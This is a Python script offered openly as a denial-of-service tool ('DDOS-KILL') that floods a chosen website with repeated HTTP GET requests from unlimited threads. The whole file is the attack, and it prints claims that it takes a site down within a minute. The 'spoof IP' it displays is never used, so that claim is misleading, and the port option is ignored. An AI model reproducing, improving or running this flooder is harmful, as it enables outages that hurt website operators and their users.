import socket
import threading
import argparse
import random
import os
import time
from colorama import Fore
from urllib.parse import urlparse

os.system('cls' if os.name == 'nt' else 'clear')

banner = Fore.GREEN + """
██████╗ ██████╗  ██████╗ ███████╗      ██╗  ██╗██╗██╗     ██╗     
██╔══██╗██╔══██╗██╔═══██╗██╔════╝      ██║ ██╔╝██║██║     ██║     
██║  ██║██║  ██║██║   ██║███████╗█████╗█████╔╝ ██║██║     ██║     
██║  ██║██║  ██║██║   ██║╚════██║╚════╝██╔═██╗ ██║██║     ██║     
██████╔╝██████╔╝╚██████╔╝███████║      ██║  ██╗██║███████╗███████╗
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝      ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝
                                                                                                                                           
CREATED BY YASIN BM = BOOMSECURITY TM TEAM

-h = help option
                                                                        """

print(banner)

parser = argparse.ArgumentParser()
parser.add_argument('u', help="ENTER TARGET WITH HTTP , HTTPS")
parser.add_argument('p', help="ENTER PORT [HTTP = 80 HTTPS = 443]", type=int)
parser.add_argument('t', help="THREADS MAX = UNLIMITED", type=int)
parser.add_argument('r', help="RPC", type=int)
args = parser.parse_args()

url = args.u
port = args.p
threads = args.t
rpc = args.r

h1 = str(random.randrange(11, 197))
h2 = str(random.randrange(0, 255))
h3 = str(random.randrange(0, 255))
h4 = str(random.randrange(2, 254))

ddd = '.'

spoofip = h1 + ddd + h2 + ddd + h3 + ddd + h4

print(f"Your spoof ip ", spoofip)

print(Fore.YELLOW + f"TARGET = {url} PORT = {port} METHOD = raw THREAD = {threads} RPC = {rpc}")
time.sleep(1)

print(Fore.CYAN + "Do not pay attention to the errors because there is no problem")
print(Fore.RED + "In normal mode, this tool shuts down the site in 30 to 1 minute after running it. If the site does not shut down, it needs to be bypassed.")
time.sleep(3)
print(Fore.RED + "[+]", Fore.GREEN + "Attack", Fore.CYAN + "Started", Fore.YELLOW + "!" + Fore.RED + "!" + Fore.GREEN + "!")


parsed_url = urlparse(url)
target = parsed_url.netloc

ua = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
]


app = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', '*/*', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html, application/xhtml+xml, image/jxr, */*', 'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1', 'text/html, image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9']
reff = ['https://www.google.com/search?q=', 'https://google.com/', 'https://www.google.com/', 'https://www.bing.com/search?q=', 'https://www.bing.com/', 'https://www.youtube.com/', 'https://www.facebook.com/']

nnn = 1

data = random._urandom(7000)

def generate_payload():
    return f'GET / HTTP/1.1\r\nHost:{target}\r\nUser-Agent:{ua}\r\nAccept: */*\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\n\r\n'.encode(encoding='utf-8')

def raw():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, 80))
            for i in range(rpc):
                payl = generate_payload()
                s.send(payl)
        except:
            pass

for _ in range(threads):
    t = threading.Thread(target=raw)
    t.start()